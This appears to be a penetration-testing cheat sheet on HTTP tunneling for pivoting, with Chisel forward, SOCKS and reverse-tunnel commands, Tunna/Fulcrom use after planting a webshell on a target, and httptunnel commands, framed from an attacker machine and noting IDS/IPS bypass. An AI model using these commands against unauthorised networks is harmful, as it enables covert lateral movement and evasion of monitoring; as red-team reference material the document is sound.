# HTTP Tunneling

## Chisel Pivoting

Chisel offers to encapsulate TCP connexions in HTTP tunnels Everything is encrypted using SSH.

```text
# Local port forwarding

# Pivot machine
$ chisel server -p 8080 --host 192.168.2.105 -v

# Attacker machine
$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80
```

```text
# Local port forwarding + SOCKS proxy

# Pivot machine
$ chisel server -p 8080 --host 192.168.2.105 --socks5 -v

# Attacker machine
$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks
```

```text
# Reverse remote port forwarding

# Attacker machine
$ chisel server -p 8888 --host 192.168.2.149 --reverse -v

# Pivot machine
$ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80
```

## Tunna / Fulcrom

```text
# Everything is through HTTP
# Bypass some IPS/IDS

# First step is to deploy webshell on the target
# Some are available with the tool (but not good)
# Can be hard to use

# Then on the attacker machine
$ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l 7777 -r 80 -a 10.42.42.2 -v
```

## HTS

```text
apt  install httptunnel
hts --forward-port localhost:8888 1234 # server side
 htc --forward-port 8080 10.11.0.128:1234 # client side
```

